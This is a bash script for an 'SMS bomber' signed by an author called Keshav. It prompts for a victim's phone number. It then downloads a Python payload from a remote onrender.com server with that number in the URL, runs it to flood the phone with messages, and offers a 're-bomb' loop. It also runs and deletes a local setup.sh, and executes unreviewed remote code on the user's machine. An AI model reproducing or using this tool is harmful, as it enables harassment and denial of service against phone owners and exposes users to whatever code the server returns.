if [ -f "setup.sh" ];
then
bash setup.sh
rm setup.sh
fi
clear
banner(){
echo -e '\e[95m
────────────█───────────────█
────────────██─────────────██
─────────────███████████████
────────────█████████████████
───────────███████████████████
──────────████──█████████──████
─────────███████████████████████
────────█████████████████████████
────────█████████████████████████
───███──▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒──███'
echo -e '\e[91m
──█████─█████████████████████████─█████
──█████─████████████████──███████─█████
──█████─██████────────█──█────███─█████
──█████─██  ▓▓▓█BOMBER──█▓▓─▓─███─█████
──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
──█████─█████────█──█─────────███─█████
──█████─█████████──██████████████─█████
───███──████████──███████████████──███
────────█████████████████████████
─────────███████████████████████
──────────█████████████████████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
──────────────████─────████

────────────────────────────────────────────────────────────────────────────────────────────
                                         INSTAGRAM:- official_.keshav'
                                         echo -e '\e[93m CODED BY KESHAV'
} 
banner
echo  -ne "\e[91m Enter Your number :-"
sleep 5

bomb(){
clear 
banner 
echo -e "\e[95m Settting Up Server"
curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1
if [ -f "keshav.py" ];
then
action=$(cat keshav.py)
if [ "$action" == "false" ];then
echo "Something Went Wrong From Server"
else
echo -e "\e[95m Bombing start"
python3 keshav.py
fi
else
echo "Something Went Wrong"
fi
con
}
con(){
echo -e " "
echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m EXIT\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
echo -ne "select:-"

read opt
if [ $opt -eq 1 ];then  
bomb
   con
    elif [ $opt -eq 2 ]; then
    clear
elif [ $opt -eq 3 ]; then
echo  -ne "\e[91m wrong input"
else 
echo  ""
fi

}
read num
bomb
